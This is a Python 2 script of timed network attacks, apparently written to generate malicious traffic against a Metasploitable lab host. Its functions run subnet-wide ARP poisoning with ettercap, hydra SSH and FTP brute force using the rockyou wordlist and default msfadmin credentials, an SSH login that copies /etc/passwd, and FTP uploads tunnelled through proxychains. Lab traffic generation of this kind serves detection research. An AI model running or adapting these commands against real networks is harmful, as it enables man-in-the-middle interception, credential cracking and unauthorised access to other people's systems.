from os import *
import sys
import time
import datetime
from datetime import timedelta
from pexpect import pxssh
import getpass


# IMPORTS & ALIAS
import setup as s
printtime = s.printtime
funcprinttime = s.funcprinttime # can't wrap this func as starttime isn't same for all attacks


#### ARP POISON
# This attack poisons the entire subnet
# To Specify targets, use: 
# system('sudo ettercap arp:remote /192.168.1.2-10// /192.168.1.2-4//') 
def arp_poison(n):
	starttime=time.time()
	endtime = time.time()+n
	funcprinttime("  Start", starttime)

	command = "sudo ettercap -T -M arp:remote /// ///"
	system(command+'& sleep '+str(n)+'; kill $!'); # kill this (most recent hidden process) at n seconds

	funcprinttime("  End", starttime)

arp_poison.desc = "Man-in-the-middle arp poisoning attack"



#### FTP IN HTTPS
#FTP connection behind a SOCKS and http proxy
#This file pulls command from ftpcommands.txt
def ftp_https(n):
	starttime=time.time()
	endtime = time.time()+n
	funcprinttime("  Start", starttime)

	try:
		while True:
			if time.time()>endtime:
				exit(0)

                        system('proxychains ftp -n < passwd_lsts/ftpcommands.txt')	#ftp uploads behind multiple proxies
			time.sleep(5)
		
	except:
		print "Could not connect to ftp server"

	funcprinttime("  End", starttime)

ftp_https.desc = "FTP traffic wrapped in HTTPS"



##### SSH Login ##### 
# ssh into metasploitable and run commands
def ssh_login(n):
	starttime=time.time()
	endtime = time.time()+n
	funcprinttime("  Start", starttime)

	while True:
		timeleft = endtime-time.time()	
		funcprinttime("  Time remaining: "+str(round(timeleft,2))+" seconds", starttime)			
		if (timeleft < 50 ):# not enough time remaining 
			time.sleep(timeleft)
			break	

		try:
			s = pxssh.pxssh()
			funcprinttime("  - Attempting ssh log in...", starttime)
			s.login('192.168.1.2','msfadmin','msfadmin')	#login
		
			funcprinttime("  - Login successful. Sending command...", starttime)
			s.sendline('cat /etc/passwd > temp.txt')	#send command
			s.prompt()
		
			s.logout()					#logout
			time.sleep(15)					

		except pxssh.ExceptionPxssh, e:
			printtime("      - Could not login to the SSH server")

	funcprinttime("  End", starttime)

ssh_login.desc = "SSH Login"



##### SSH Brute Force #####
def ssh_brute(n):
	starttime=time.time()
	endtime = time.time()+n
	funcprinttime("  Start", starttime)

	system("rm hydra.restore") # cleanup last time hydra ran

	command = "sudo hydra -l msfadmin -P passwd_lsts/rockyou.txt 192.168.1.2 ssh"
	system(command+'& sleep '+str(n)+'; kill $!'); # kill the most recent hidden process after n seconds

	funcprinttime("  End", starttime)

ssh_brute.desc = "SSH brute force"



##### FTP Brute Force ##### 
def ftp_brute(n):
	starttime=time.time()
	endtime = time.time()+n
	funcprinttime("  Start", starttime)

	system("rm hydra.restore") # cleanup last time hydra ran

	command = "sudo hydra -l msfadmin -P /root/Desktop/attacks/passwd_lsts/rockyou.txt 192.168.1.2 ftp"
        while endtime>time.time():
                endtimer = str(endtime-time.time())
                system('timeout --kill-after='+endtimer+'s '+endtimer+'s '+command);
        	funcprinttime("  - scan complete", starttime)
	        timeleft = endtime-time.time()	    
                #funcprinttime(" timeleft: "+str(timeleft), starttime)
        funcprinttime("  End", starttime)
ftp_brute.desc = "FTP brute force"











